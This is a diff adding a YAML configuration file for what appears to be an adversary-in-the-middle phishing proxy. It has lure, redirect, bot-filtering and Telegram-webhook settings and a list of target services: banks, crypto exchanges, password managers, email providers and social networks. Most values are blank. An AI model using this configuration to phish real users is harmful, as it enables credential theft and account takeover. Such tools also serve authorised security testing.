@@ -1,0 +1,74 @@
+blacklist_mode: "off"
+cookie_key: ""
+ip: 127.0.0.1
+lures: []
+nkpbot_enabled: false
+ota_enabled: false
+proxy_address: ""
+proxy_enabled: false
+proxy_password: ""
+proxy_port: 0
+proxy_type: http
+proxy_username: ""
+redirect_key: vo
+server: ""
+simplebot_enabled: false
+site_domains:
+    amazon: ""
+    aws: ""
+    binance: ""
+    blockchain: ""
+    boa: ""
+    bypass-flagged: ""
+    canada: ""
+    cex: ""
+    cex.io: ""
+    chase: ""
+    coinbase: ""
+    cryptobox: ""
+    dashlane: ""
+    discord: ""
+    dropbox: ""
+    europol: ""
+    facebook: ""
+    flexiti: ""
+    gemini: ""
+    gend: ""
+    github: ""
+    glady: ""
+    google: ""
+    hightail: ""
+    icloud: ""
+    instagram: ""
+    knowbe4: ""
+    lastpass: ""
+    lcl: ""
+    linkedin: ""
+    mail: ""
+    mail.ru: ""
+    mailgun: ""
+    nsbank: ""
+    o365: ""
+    outlook: ""
+    ovh: ""
+    payfit: ""
+    payoneer: ""
+    paypal: ""
+    poloniex: ""
+    protonmail: ""
+    sendgrid: ""
+    skrill: ""
+    skype: ""
+    snapchat: ""
+    stripe: ""
+    tiktok: ""
+    twitter: ""
+    xfinity: google2.com
+    yahoo: ""
+sites_enabled: []
+turnstile_privkey: ""
+turnstile_sitekey: ""
+verification_key: mf
+verification_token: d88e
+webhook_telegram: ""
+webhook_verbosity: 1
